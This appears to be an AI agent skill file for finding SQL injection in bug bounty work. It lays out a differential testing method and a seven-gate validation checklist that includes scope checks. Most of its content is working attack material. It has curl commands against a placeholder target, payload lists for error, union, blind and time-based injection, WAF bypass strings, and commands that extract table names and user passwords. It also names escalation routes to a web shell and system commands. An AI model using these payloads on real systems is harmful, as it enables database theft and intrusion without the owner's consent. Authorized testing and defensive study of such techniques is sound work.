---
name: hunt-sqli
description: SQL Injection hunting with differential testing — Error-based, Blind, Union, Time-based. WAF bypass techniques. Every candidate must demonstrate data extraction or impact. 7-gate validation mandatory.
---

# SQL INJECTION HUNTING — DIFFERENTIAL TESTING METHOD

**SQLi is only a vulnerability if you can extract data or impact the database.**

---

## HYPOTHESIS GENERATION

```
HYPOTHESIS: SQLi on [endpoint]
  Endpoint: [METHOD] [URL with parameter]
  Parameter: [param_name]
  Precondition: [authenticated/unauthenticated]
  Expected: Parameterized query
  Attack: SQL syntax executes in database
  Impact: Data extraction / modification / RCE
  Confidence: [HIGH/MEDIUM/LOW]
```

---

## DIFFERENTIAL TESTING METHOD

### Core Principle

> **The vulnerability is not that the server returns an error. The vulnerability is that SQL syntax injected by the attacker is interpreted by the database.**

### Error-Based Differential

```
TEST MATRIX:
  Normal input (1) → 200 with expected data
  SQL syntax (1') → 200 with DIFFERENT data OR SQL error
  Boolean true (1' AND 1=1--) → same as normal
  Boolean false (1' AND 1=0--) → DIFFERENT from normal

FINDING: If input changes SQL behavior → SQLi
NOT A FINDING: If parameterized queries handle all inputs
```

### Implementation

```bash
TARGET="https://target.com/api/users?id="

# Step 1: Baseline — normal input
echo "=== BASELINE ==="
curl -s "$TARGET"1 | python3 -m json.tool
# EXPECTED: Normal user data

# Step 2: Error trigger
echo "=== ERROR TRIGGER ==="
curl -s "$TARGET"1'" | head -20
# EXPECTED: SQL error (syntax error, mysql error, etc.)
# IF ERROR → SQLi possible

# Step 3: Boolean differential
echo "=== BOOLEAN TRUE ==="
curl -s "$TARGET"1'+AND+1=1--" | python3 -m json.tool

echo "=== BOOLEAN FALSE ==="
curl -s "$TARGET"1'+AND+1=0--" | python3 -m json.tool

# DIFFERENTIAL: If Boolean TRUE matches baseline but Boolean FALSE differs → SQLi CONFIRMED
```

---

## PAYLOAD ARSENAL

### Detection

```sql
'
''
`)
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL
'; SELECT SLEEP(5)--         -- MySQL
' OR SLEEP(5)--
```

### Union-Based

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi (Time-based)

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- PostgreSQL
' AND pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### Error-based

```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
```

### WAF Bypass

```sql
/*!50000 SELECT*/ * FROM users    -- MySQL inline comment
SE/**/LECT * FROM users            -- comment injection
SeLeCt * FrOm uSeRs              -- case variation
%27 OR %271%27=%271               -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                      -- Unicode apostrophe
```

---

## DATA EXTRACTION

```bash
# Extract database version
curl -s "$TARGET?' UNION SELECT @@version,NULL,NULL--"

# Extract table names
curl -s "$TARGET?' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"

# Extract column names
curl -s "$TARGET?' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--"

# Extract user data
curl -s "$TARGET?' UNION SELECT username,password,NULL FROM users--"
```

---

## GATE VALIDATION CHECKLIST

### Gate 1 — Scope
- [ ] Affected endpoint is in scope

### Gate 2 — Security Boundary
- [ ] Database integrity/confidentiality violated
- [ ] What data was extracted?

### Gate 3 — Attacker Capability
- [ ] Starting position documented

### Gate 4 — Reproducibility
- [ ] Exact request/response captured
- [ ] SQL error or extracted data shown

### Gate 5 — Impact
- [ ] Select impact:
  - Error message only → Low (info disclosure)
  - Data extraction (read) → High (data breach)
  - Data modification (write) → Critical (data manipulation)
  - INTO OUTFILE → Critical (RCE)
  - Stored procedure → Critical (system commands)

### Gate 6 — False Positive Elimination
- [ ] Error is SQL-specific (not generic application error)
- [ ] Data actually extracted (not just error)
- [ ] Not a WAF/CDN error page

### Gate 7 — Program Acceptance
- [ ] SQLi is in scope
- [ ] Impact meets threshold

---

## ESCALATION PATHS

```
SQLi (error only) → Information disclosure → Low
SQLi (data read) → Data breach → High
SQLi (data write) → Data manipulation → Critical
SQLi (INTO OUTFILE) → Web shell → RCE → Critical
SQLi (stored procedures) → System commands → Critical
```
